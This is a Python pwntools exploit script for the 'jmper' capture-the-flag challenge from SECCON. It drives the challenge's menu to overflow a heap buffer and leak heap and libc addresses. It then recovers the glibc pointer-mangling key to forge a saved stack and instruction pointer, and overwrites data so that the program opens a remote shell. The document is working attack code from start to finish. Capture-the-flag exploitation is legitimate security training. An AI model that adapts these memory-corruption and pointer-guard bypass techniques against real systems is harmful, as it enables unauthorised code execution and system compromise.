from pwn import *
context.log_level = 'debug'

def menu():
    r.recvuntil("6. Bye :)\n")

def add():
    menu()
    r.send("1\n")

def memo(idx, d):
    menu()
    r.send("3\n")
    r.send("%d\n" % idx)
    r.send(d + "\n")

def sm(idx):
    menu()
    r.send("5\n")
    r.send("%d\n" % idx)

def name(idx, d):
    menu()
    r.send("2\n")
    r.send("%d\n" % idx)
    r.send(d + "\n")

def sn(idx):
    menu()
    r.send("4\n")
    r.send("%d\n" % idx)

def ror(x, y):
    return (x >> y | x << (64 - y)) % (1<<64)

def rol(x, y):
    return (x << y | x >> (64 - y)) % (1<<64)

def mangle(x, y):
    return rol(x ^ y, 0x11)

MAIN = 0x400c31
r = remote('jmper.pwn.seccon.jp', 5656)
add()
memo(0, "A"*32)
sm(0)
h = "ID:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
heap_base = u32(r.readline()[len(h):len(h) + 4]) - 0x20
#heap_base &= 0x00ffffff
print("HEAP_ADDRESS : %16X" % (heap_base))
add()
memo(1, "\x78"*33)
name(1, p64(heap_base - 0xc0))
#raw_input()
sn(1)
l = r.readline()[3:3 + 16]
enc_sp, enc_pc = u64(l[:8]), u64(l[8:])
key = (ror(enc_pc, 0x11) ^ MAIN)
enc_sp = ror(enc_sp, 0x11) ^ key
sp = heap_base + 0xc28
pc = 0x400CC3
enc_sp = mangle(sp, key)
enc_pc = mangle(pc, key)
name(1, p64(enc_sp) + p64(enc_pc))
print("Key : %16X" % key)

add()
add()
memo(3, "\x58"*33)
name(3, p64(0x601FB0))
sn(3)
libc_base = u64(r.readline()[3:3+6] + "\x00"*2) - 0x0000000000021e50
print("LIBC_BASE : %16X" % libc_base)

memo(0, "A" *8 +  p64(libc_base + 0x017C8C3) + p64(libc_base + 0x0000000000046590))

for i in xrange(29 - 5):
    add()

add()
memo(28, p64(libc_base + 0x017C8C3) + p64(libc_base + 0x0000000000046590))
raw_input('gogo\n')
add()

r.interactive()
